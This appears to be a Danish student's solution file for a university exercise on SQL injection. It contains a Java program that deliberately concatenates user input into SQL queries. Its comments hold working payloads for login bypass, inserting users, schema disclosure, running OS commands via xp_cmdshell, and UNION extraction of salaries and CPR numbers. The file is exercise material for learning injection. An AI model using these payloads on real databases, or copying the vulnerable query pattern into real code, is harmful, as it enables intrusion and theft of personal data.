import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.io.*;

public class main {
    /**
     * @param args
     */
    public static void main(String[] args) {
        BufferedReader inLine;
        Connection minConnection;
        try {
            inLine = new BufferedReader(new InputStreamReader(System.in));
            System.out.println("Indtast a eller b for delopgave a eller b");
            String delopgave = inLine.readLine();
            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
            minConnection = DriverManager.getConnection("jdbc:sqlserver://localhost\\SQLEXPRESS;" +
                    "databaseName=tempdb;user=xx;password=67");
            Statement stmt = minConnection.createStatement();
            if (delopgave.equals("a")) {  // denne del bruges til delopgaver 1 - 5
                System.out.println("Indtast brugernavn");
                String s1 =inLine.readLine();
                System.out.println("Indtast password");
                String s2 =inLine.readLine();
                String s = "select * from brugere where brugerid = '" + s1 +
                        "' and passw = '" + s2 + "'";
                System.out.println(s);
                ResultSet res=stmt.executeQuery(s);
                if (res.next()) {
                    System.out.print("Velkommen du er nu logget ind");
                }
                else
                    System.out.print("Ukorrekt login");
                if (stmt != null)
                    stmt.close();
                if (minConnection != null)
                    minConnection.close();

                /**
                 select * from brugere
                 where brugerid = '' or 1=1 --(-- kunne også bruges allerede her)
                 and passw = '' or 1=1


                 --Opgave 30.a.2
                 --Prøv at se om du med SQL-injektion kan logge dig selv på (dvs få Velkommen –
                 --beskeden).
                 ' or 1=1 + '
                 select * from brugere where brugerid = '' or 1=1 + '' and passw = '' or 1=1 + ''


                 --Opgave 30.a.3
                 --Prøv at se om du kan få indsat en ny bruger i tabellen med brugere.
                 ' or 1=1 insert into brugere values ('joe','joe') --'
                 select * from brugere where brugerid = '' or 1=1 + '' and passw = '' or 1=1 insert into brugere values ('joe','joe') --'


                 --Opgave 30.a.4
                 --Du har i opgave 30.a.3 antageligvis bare kikket i koden for at se det rigtige tabelnavn til
                 --din INSERT. Den mulighed har en hacker jo normalt ikke, men prøv at se om du ikke
                 --kan få tabelnavne og attributnavne ud i en fejlreaktion.

                 ' having 1=1 --   '

                 select * from brugere where brugerid = '' having 1=1 --' and passw = 'fdfsdaf'


                 --Opgave 30.a.5
                 --I masterdatabasen på SQL-server findes en stored procedure kaldet xp_cmdshell. Via den kan du få afviklet en DOS-kommando på serveren.
                 --Prøv at se om du kan få kaldt den via SQL-injektion.
                 --Som sagt findes xp_cmdshell kun i Master-databasen – du skal derfor have en use
                 --master inden kaldet til xp_cmdshell.
                 --Selve kaldet til xp_cmdshell er som en helt normal stored procedure, dvs
                 --Exec xp_cmdshell ”en DOS-komando” (” ” skal med i dit kald)
                 --For at se om den faktisk kører DOS-kommandoen foreslår jeg at du sætter en USB-pen i
                 --din PC og udfører denne DOS-kommando:
                 --Dir c: >> d:/test.txt
                 use master
                 EXECUTE sp_configure 'show advanced options', 1
                 RECONFIGURE WITH OVERRIDE
                 GO
                 EXECUTE sp_configure 'xp_cmdshell', '0' --1 for at åbne, 0 for at lukke igen
                 RECONFIGURE WITH OVERRIDE
                 GO
                 EXECUTE sp_configure 'show advanced options', 0
                 RECONFIGURE WITH OVERRIDE

                 Exec xp_cmdshell 'Dir c: >> d:/test.txt'

                 ' or 1=1 + '
                 use master Exec xp_cmdshell 'Dir d: >> d:/test.txt'--
                 ' use master Exec xp_cmdshell 'Dir c: >> C:\Users\Desktop\test.txt'-- '
                 use tempdb
                 select * from brugere where brugerid = '' or 1=1 + '' and passw = '' or 1=1 use master Exec xp_cmdshell 'Dir c: >> C:\Users\Desktop\test.txt'--'
                 */
            }
            else {  // denne del anvendes til delopgave 6

                System.out.println("Indtast søgestreng");
                String s3 = inLine.readLine();
                String s = "select produktnavn,lagerantal, pris from produkt " +
                        "where produktnavn like '" + s3 + "%'";
                System.out.println(s);
                Statement stmt2 = minConnection.createStatement();
                ResultSet res2=stmt2.executeQuery(s);
                while (res2.next()) {
                    System.out.println (res2.getString(1) + "   " + res2.getInt(2) +
                            "      " + res2.getFloat(3));
                }
                if (stmt2 != null)
                    stmt2.close();
                if (minConnection != null)
                    minConnection.close();

                /** --------------------------- B ---------------------------
                 --Opgave 30.b.6
                 --Vi skal nu anvende b-delen af programmet. Vi forestiller os at du helt lovligt kan køre
                 --programmet, så det viser produktnavne, lagerantal og pris på produkter, der starter med
                 --en bestemt streng.
                 --Den pågældende database indeholder imidlertid også en tabel loenopl, der indeholder
                 --fortrolige oplysninger, du er meget interesseret i.
                 --Prøv ved hjælp af SQL-injektion i b-delen af programmet at få oplysninger fra loenopltabellen ud på skærmen
                 use tempdb
                 select produktnavn,lagerantal, pris
                 from produkt
                 where produktnavn like '%'
                 union
                 select navn, cast(cpr as int), loen
                 from loenopl --
                 --ELLER
                 select navn, 0, loen
                 from loenopl --

                 ' union select navn, cast(cpr as int), loen from loenopl--
                 '

                 --Opgave 30.b.7
                 --I SQL-Server opbevares SQL-servers egne data i de såkaldte systemtabeller. Der findes
                 --et sæt systemtabeller for hver database. Man kan således læse oplysninger om tabeller og
                 --attributter ved at selecte fra systemtabellerne.
                 --Prøv fra Management Studio at køre følgende SQL-sætning, der anvender systemtabellerne:

                 select obj.name, col.name
                 from syscolumns col,sysobjects obj
                 where obj.category = 0 and col.id=obj.id and
                 obj.type='u'

                 --Prøv derefter at anvende ovenstående SQL-sætning på b-delen af programmet til at få
                 --tabel- og attribut-navne ud.

                 select produktnavn, lagerantal, pris
                 from produkt
                 where produktnavn like ''
                 union
                 select concat(obj.name, col.name), 0, 0
                 from syscolumns col, sysobjects obj where obj.category = 0 and col.id = obj.id and obj.type = 'u'-- %'
                 ' select obj.name, col.name from syscolumns col, sysobjects obj where obj.category = 0 and col.id = obj.id and obj.type = 'u' -- '
                 --Dette virker ikke, vi skal åbenbart bruge union

                 ' union select concat(obj.name, col.name), 0, 0 from syscolumns col, sysobjects obj where obj.category = 0 and col.id = obj.id and obj.type = 'u' -- '

                 --Opgave 30.8
                 --Forklar hvilke sikkerhedsmæssige uhensigtsmæssigheder, der er i det program, jeg har
                 --lavet. Hvad vil modtrækkende være (du skal i første omgang bare forklare – hvis tiden
                 --tillader det, ændrer du programmet, så det sikkerhedsmæssigt er bedre)
                 1. Bruger SA som login, når det burde være en mindre kraftig bruger
                 2. Den printer e.getMessage som giver indblik i systemets arkitektur mm.
                 3.
                 */
            }
        }
        catch (Exception e) {
            System.out.print("fejl:  "+e.getMessage());
        }
    }
}